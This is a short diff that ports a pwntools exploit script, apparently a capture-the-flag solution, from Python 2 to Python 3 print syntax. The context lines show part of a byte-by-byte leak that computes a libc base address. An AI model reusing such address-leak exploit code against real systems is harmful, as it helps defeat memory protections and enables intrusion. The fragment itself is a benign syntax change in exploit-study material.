@@ -1,3 +1,4 @@
+from __future__ import print_function
 from pwn import *
 from hashlib import sha256
 import string
@@ -40,7 +41,7 @@ for i in range(3,7):
         log.info('FAILED')
         exit()
     tmp=tmp*256+size
-    print size
+    print(size)
 tmp=(tmp-0x208)*256
 libc_base = tmp
 log.info("libc: "+hex(libc_base))
